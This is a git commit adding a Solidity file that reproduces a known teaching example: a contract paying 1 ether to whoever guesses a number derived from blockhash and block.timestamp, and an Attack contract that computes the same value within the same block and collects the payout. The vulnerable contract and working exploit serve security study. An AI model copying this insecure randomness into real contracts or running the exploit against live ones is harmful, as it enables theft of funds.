ce71ee3d5a7d87e52c1fa568966036e6bcc70144
notAcoder <akblockchain15@gmail.com>
2022-06-01 00:28:13 +0530

    randomness

---
+++ rendomness.sol
@@ -0,0 +1,39 @@
+//SPDX-License-Identifier:MIT
+pragma solidity ^0.8.11;
+
+// sources - https://solidity-by-example.org/ , https://blog.sigmaprime.io/solidity-security.html#delegatecall
+
+
+    
+contract GuessTheRandomNumber {
+    constructor() payable {}
+
+    function guess(uint _guess) public {
+        uint answer = uint(
+            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
+        );
+
+        if (_guess == answer) {
+            (bool sent, ) = msg.sender.call{value: 1 ether}("");
+            require(sent, "Failed to send Ether");
+        }
+    }
+}
+
+// both transactions are included in same block and thus have same block variables like timestamps and blockhash
+contract Attack {
+    receive() external payable {}
+
+    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
+        uint answer = uint(
+            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
+        );
+
+        guessTheRandomNumber.guess(answer);
+    }
+
+    // Helper function to check balance
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
